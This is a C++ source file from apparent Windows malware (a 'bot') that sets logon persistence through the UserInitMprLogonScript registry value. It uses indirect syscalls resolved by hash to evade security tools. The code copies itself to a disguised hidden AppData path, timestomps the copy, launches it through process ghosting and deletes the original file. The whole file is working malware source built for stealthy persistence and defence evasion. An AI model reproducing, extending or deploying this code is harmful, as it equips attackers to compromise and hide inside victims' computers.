#include "Modules/persistence.h"
#include "Core/api_resolve.h"
#include "Core/syscalls.h"
#include "Modules/recon.h"
#include "Evasion/timestomp.h"
#include "Utils/helpers.h"
#include "Modules/ghost.h"
#include <cstdio>
#include <cstring>

void Internal_Persist(const wchar_t* botPath) {
    API_TABLE& API = GetAPI();
    if (!API.hasPersistence) return;

    HANDLE hKey;
    NTSTATUS status;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uKeyName, uValueName, uSid;
    SYSCALL_GATE gate;
    
    // get users Native SID
    if (!GetNativeUserSID(&uSid)) {
        return; 
    }

    //Native Path: \Registry\User\<SID>\Environment
    wchar_t regPath[512] = L"\\Registry\\User\\";
    wcscat_s(regPath, 512, uSid.Buffer);
    wcscat_s(regPath, 512, L"\\Environment");

    mRtlInitUnicodeString(&uKeyName, regPath);
    mRtlInitUnicodeString(&uValueName, L"UserInitMprLogonScript");
    InitializeObjectAttributes(&objAttr, &uKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    // NtCreateKey 
    gate = GetSSNByHash(0X8C622C2C362844A4);
    PREPARE_SYSCALL(gate);
    status = IndirectSyscall((ULONG_PTR)&hKey, (ULONG_PTR)KEY_WRITE | KEY_READ, (ULONG_PTR)&objAttr, 0, (ULONG_PTR)NULL, (ULONG_PTR)0, (ULONG_PTR)NULL, 0, 0, 0, 0);

    if (status == 0) {
        // NtSetValueKey 
        gate = GetSSNByHash(0X2DF2E5798BBD5579);
        PREPARE_SYSCALL(gate);
        status = IndirectSyscall((ULONG_PTR)hKey, (ULONG_PTR)&uValueName, 0, (ULONG_PTR)1, (ULONG_PTR)botPath, (ULONG_PTR)(wcslen(botPath) * sizeof(WCHAR)), 0, 0, 0, 0, 0);

        // NtClose
        gate = GetSSNByHash(0X4F3163BAF74EFD5D);
        PREPARE_SYSCALL(gate);
        IndirectSyscall((ULONG_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    }

    // free allocated memory from RtlConvertSidToUnicodeString
    HMODULE hNtdll = (HMODULE)GetModuleBaseByHash(0XE1193D187E7EA30D);
    pfnRtlFreeUnicodeString RtlFreeStr = (pfnRtlFreeUnicodeString)GetProcAddressByHash(hNtdll, 0X10AE05083C9197B7);
    
    if (RtlFreeStr) {
        RtlFreeStr(&uSid);
    }
}

bool safe_migrate() {
    API_TABLE& API = GetAPI();
    wchar_t current_path[MAX_PATH];
    wchar_t target_path[MAX_PATH];
    wchar_t appData[MAX_PATH];

    API.GetModuleFileNameW(NULL, current_path, MAX_PATH);

    // Ghost detection
    HANDLE hSelf = API.CreateFileW(current_path, GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hSelf == INVALID_HANDLE_VALUE) {
        return false;  // ghosted instance — continue normally
    }
    API.CloseHandle(hSelf);

    // Build target path
    API.GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH);
    swprintf(target_path, MAX_PATH, L"%ls\\Microsoft\\Spelling\\neutral\\default.exe", appData);

    bool firstRun = (wcscmp(current_path, target_path) != 0);

    if (firstRun) {
        // First execution - copy to AppData for persistence
        if (!API.CopyFileW(current_path, target_path, FALSE))
            return false;
        timestomp(target_path);
        API.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }

    // Read persistence file into buffer
    HANDLE hFile = API.CreateFileW(target_path, GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, NULL);
    PVOID buf = API.RtlAllocateHeap(API.GetProcessHeap(), 0, fileSize);
    DWORD bytesRead = 0;
    API.ReadFile(hFile, buf, fileSize, &bytesRead, NULL);
    API.CloseHandle(hFile);

    // Ghost execute — no spoof (ghosted child detects via missing file)
    NTSTATUS status = GhostExecute(buf, (SIZE_T)fileSize);
    API.RtlFreeHeap(API.GetProcessHeap(), 0, buf);

    if (status != 0) return false;

    if (firstRun) {
        Internal_Suicide(current_path);  // delete original only
    }

    API.ExitProcess(0);  // ghosted child takes over
    return true;
}
